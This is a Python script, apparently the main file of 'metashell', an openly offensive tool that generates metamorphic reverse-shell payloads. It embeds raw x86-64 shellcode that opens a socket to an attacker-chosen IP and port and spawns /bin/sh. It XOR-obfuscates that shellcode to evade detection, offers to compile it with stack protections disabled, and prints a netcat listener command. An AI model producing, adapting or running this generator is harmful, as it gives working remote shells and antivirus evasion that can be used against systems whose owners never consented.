#!/usr/bin/env python3

from sys import argv,stderr
from argparse import ArgumentParser
from metashell import dechex
from metashell import bloc
from metashell import build

class argwrap(ArgumentParser):
    def error(self, message):
        self.print_help(stderr)
        self.exit(2, f'\n [!] Error: {message}\n\n')


def main():
    # font : Elite on https://patorjk.com/software/taag
    banner = '''
    • ▌ ▄ ·. ▄▄▄ .▄▄▄▄▄ ▄▄▄· .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
    ·██ ▐███▪▀▄.▀·•██  ▐█ ▀█ ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
    ▐█ ▌▐▌▐█·▐▀▀▪▄ ▐█.▪▄█▀▀█ ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
    ██ ██▌▐█▌▐█▄▄▌ ▐█▌·▐█ ▪▐▌▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
    ▀▀  █▪▀▀▀ ▀▀▀  ▀▀▀  ▀  ▀  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 
       
       Simple metamorphic reverse shell generator.

                Vadimador - Ninuuu - t4yki
         https://github.com/Vadimador/metashell

    '''

    basicshell = "4831c04831db4831d24831ff4831f6b02940b70240b6010f054989c7b02a4c89ff4831f6ip56port666a024889e6b2180f054831c04831d2b0214c89ff4831f60f054831c04831d2b0214c89ff48ffc60f054d31ff4d31f64831ff4831f64831c0415749bf2f2f62696e2f736841574889e74156574889e6b03b4831d20f05b03c4831ff0f05"
    cryptshell = "portipkey"
    baseshell = basicshell

    parser = argwrap(ArgumentParser().prog)
    parser.add_argument('-i', '--ip', dest='ip', help='IPv4 Address', required=True)
    parser.add_argument('-p', '--port', dest='port', help='Port to bind', required=True)
    parser.add_argument('-e', '--endian', dest='endianness', choices=['big', 'little'], help='Endianness of the target, default=little', default='little', required=False)
    parser.add_argument('-x', '--xornb', dest='xornb', help='Number of xor to put, default=10', type=int, default=10, required=False)
    parser.add_argument('-b', '--build', dest='compile', help="Compile the C file", action='store_true', required=False)
    parser.add_argument('-hs', '--hide-shellcode', dest='hide_shellcode', help="Hide the shellcode printing", default=False, action='store_true', required=False)
    parser.add_argument('-v', '--verbose', dest='verbosity', help='Add verbosity printing', action='store_true', default=False, required=False)
    parser.add_argument('-o', '--outfile', dest='outfile', help='Outfile shellcode\'s name', default='shellcode.txt', required=False)
    parser.add_argument('-cl','--crypt-listener',dest='iscrypt',help='Create a cryptshell with his listener',default=False,action='store_true',required=False)
    args = parser.parse_args()

    if len(argv) < 5:
        print(f'{banner}')
        parser.print_help()
        exit(1)
    
    # Si le mode iscrypt est activé, on switch de shell
    if args.iscrypt : 
        baseshell = cryptshell

    iphex = dechex.iphex(args.ip, args.endianness)
    porthex = dechex.porthex(args.port, args.endianness)
    xornb = args.xornb
    outfile = args.outfile

    if iphex and porthex:
        ipbloc = bloc.ip(iphex)
        portbloc = bloc.port(porthex)
        key = ""

        if args.iscrypt: # on génère la clé si le mode crypt est utilisé
            key = bloc.key()

        shellcode = build.shellcode(baseshell, ipbloc, portbloc, xornb, outfile, args.iscrypt, key)
        if args.compile:
            build.compile()

        if not args.hide_shellcode and not args.verbosity:
            print(f'{shellcode}')
        
        if args.verbosity:
            print(f'{banner}')
            if not args.hide_shellcode:
                print(f' [!] Shellcode generated : \n\n{shellcode}\n\n')
            else:
                print(f' [!] Shellcode saved at shellcode.txt\n')
                print(f' [+] Number of xor put : {args.xornb}')
                print(f' [+] IPv4 address to connect to : {args.ip}')
                print(f' [+] Port to bind : {args.port}')
            if args.compile:
                print(' [+] Compiled shellcode : reverse_shell')
                print(f' [+] Start a listener : nc -lvnp {args.port}\n')
            else:
                print(' [+] C file to test the shellcode : reverse_shell.c')
                print(' [+] Build : gcc reverse_shell.c -o shell -fno-stack-protector -z execstack -no-pie\n')
    else:
        print(f'{banner}')
        parser.print_help()
        print('\n [-] Invalid ip address or port value.\n')
        exit(1)
    

if __name__ == '__main__':
    main()
